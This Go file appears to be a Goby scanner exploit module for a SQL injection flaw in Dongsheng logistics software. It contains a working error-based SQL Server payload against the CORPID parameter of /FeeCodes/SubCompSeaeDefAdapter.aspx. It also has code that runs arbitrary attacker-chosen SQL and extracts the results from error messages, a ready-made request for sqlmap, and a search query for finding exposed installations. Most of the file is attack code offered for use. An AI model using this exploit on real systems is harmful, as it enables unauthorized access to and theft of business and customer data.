package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Dongsheng Logistics Software /FeeCodes/SubCompSeaeDefAdapter.aspx SQL Injection Vulnerability",
    "Description": "<p>Dongsheng logistics information management system breaks the traditional \"manual\" reconciliation mode, and transforms into a monthly statement automatically sent to customers through technical means, and the supplier statement can be introduced into the system with one click and automatically verify the amount and the main bill of lading number, and produce reconciliation results, improve the work efficiency of reconciliation personnel, and reduce reconciliation errors.</p><p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.</p>",
    "Product": "Dongsheng logistics software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-10-10",
    "PostTime": "2024-10-29",
    "Author": "2974057526@qq.com",
    "FofaQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "GobyQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "Level": "1",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.   </p><p> 2. If it is not necessary, it is forbidden to access the system on the public network.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/134656440"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /FeeCodes/SubCompSeaeDefAdapter.aspx SQL 注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>东胜物流信息管理系统打破传统的“手动”对账模式，转变为通过技术手段将月结账单自动发送给客户，供应商对账单可以一键引入系统并自动校验金额和主提单号，出对账结果，提高对账人员的工作效率，减少对账误差。<br></p><p>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。 经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。<br></p>",
            "Recommendation": "<p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software /FeeCodes/SubCompSeaeDefAdapter.aspx SQL Injection Vulnerability",
            "Product": "Dongsheng logistics software",
            "Description": "<p>Dongsheng logistics information management system breaks the traditional \"manual\" reconciliation mode, and transforms into a monthly statement automatically sent to customers through technical means, and the supplier statement can be introduced into the system with one click and automatically verify the amount and the main bill of lading number, and produce reconciliation results, improve the work efficiency of reconciliation personnel, and reduce reconciliation errors.<br></p><p>Attackers can access the data in the database without authorization, steal users' privacy and personal information, and cause information leakage. You can add or delete data from the database, such as adding or deleting administrator accounts. If the website directory has write permissions, you can write a web Trojan. Attackers can then tamper with web pages and publish illegal information. After privilege escalation and other steps, the highest privilege of the server is obtained by the attacker. An attacker can remotely control a server, install a backdoor, and modify or control the operating system.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;&nbsp;</p><p>&nbsp;2. If it is not necessary, it is forbidden to access the system on the public network.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	sendPayload_acbhs4 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//拼接sql语句
		var payload string
		payload = `%27)+and+1=(` + sql + `)--+`
		url := `/FeeCodes/SubCompSeaeDefAdapter.aspx?CORPID=-122` + payload

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		}
		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_acbhs4
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "DB_NAME()"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, `转换成数据类型 int 时失败`) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/FeeCodes/SubCompSeaeDefAdapter.aspx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_acbhs4
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 500") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`在将 nvarchar 值 '([^']*)' 转换成数据类型 int 时失败`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult

			case "sqlpoint":
				sql := "DB_NAME()"
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `GET /FeeCodes/SubCompSeaeDefAdapter.aspx?CORPID=-122%27)+and+1=(DB_NAME())--+ HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
